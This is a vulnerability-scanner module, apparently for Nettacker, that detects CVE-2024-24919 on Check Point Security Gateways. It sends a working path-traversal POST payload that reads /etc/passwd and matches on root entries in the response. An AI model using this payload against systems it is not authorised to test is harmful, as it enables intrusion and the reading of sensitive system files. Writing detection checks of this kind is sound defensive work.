info:
  name: checkpoint_cve_2024_24919_vuln
  author: Eshaan Agrawal
  severity: 8.6
  description: CVE-2024-24919 is an unauthenticated path traversal vulnerability in Check Point Security Gateways allowing arbitrary file read. This module detects the vulnerability by attempting to read the /etc/passwd file.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-24919
    - https://support.checkpoint.com/results/sk/sk182336
  profiles:
    - vuln
    - http
    - high_severity
    - cve
    - cve2024
    - cisa_kev
    - checkpoint

payloads:
  - library: http
    steps:
      - method: post
        timeout: 5
        headers:
          User-Agent: "{user_agent}"
        allow_redirects: false
        ssl: false
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              path:
                - "clients/MyCRL"
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
                - 8080
                - 8443
        data: "aCSHELL/../../../../../../../etc/passwd"
        response:
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false
            content:
              regex: "root:.*:0:0:"
              reverse: false
